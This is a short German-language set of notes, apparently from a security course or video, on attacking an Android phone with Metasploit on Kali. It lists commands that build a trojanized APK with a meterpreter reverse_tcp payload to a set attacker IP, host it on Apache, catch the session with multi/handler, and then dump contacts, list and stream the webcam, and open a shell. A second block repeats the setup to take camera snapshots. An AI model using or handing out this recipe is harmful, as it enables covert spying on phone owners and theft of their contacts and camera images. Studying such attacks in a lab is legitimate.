# android hacking with metasploit kali 
#### datum: 13.05.2020
[link](https://www.youtube.com/watch?v=YRm-St0bJhU)
---
###
> 1. es wird eine android applikation erstellt, mit einer einfachen view 
> 2. msfvenom (framework) 
> 2.1. msfpayload
> 2.2. msfencode 	

```
0. [new terminal 0]
1. [0] ifconfig 
2. [0] msfvenom -help 
3. [0] msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=4444 R > /var/www/html/androidApp.apk
4. [0] service apache2 status 
5. [0] msfconsole 
6. [0] use exploit/mulit/handler
7. [0] set payload android/meterpreter/reverse-tcp 
8. [0] show options
9. [0] set LHOST 192.168.1.23 [ip-Virtual Box]
10. [0] show options
11. [0] exploit 
12. [0] background
13. [0] sessions
14. [0] sessions -i 1
15. [0] help
16. [0] app_list
17. [0] dump_contacts
18. [new terminal 1]
19. [1] cat contacts dump 20190915183350.txt
20. [0] webcam_list
21. [0] background
22. [0] exploit (muli/handler)
23. [0] sessions
24. [0] exploit
25. [0] background
26. [0] sessions
27. [0] sessions -i 8
28. [0] help
29. [0] webcam_list
30. [0] shell
31. [0] ls
32. [0] whoiam
33. [0] pwd
34. 
```
---
### prof. 
> snap-shot mit der handykamera
```
0. use exploit/multi/handler
1. set payload android/meterpreter/reverse_tcp
2. set lhost 192.168.0.132
3. show options 
4. exploit 
5. webcam_steam -h // get help
6. webcam_list
7. webcam_stream -d 5 -i 1 // d (duration aufnahmezeit/ index of webcam)
8. [rage quit]
9. cd /home/kali/
10. msfconsole
11. [alles wie vorher]
12. webcam_stream -d 5 -i 1 
13. cp [daten] /var/www/html 
14. 
```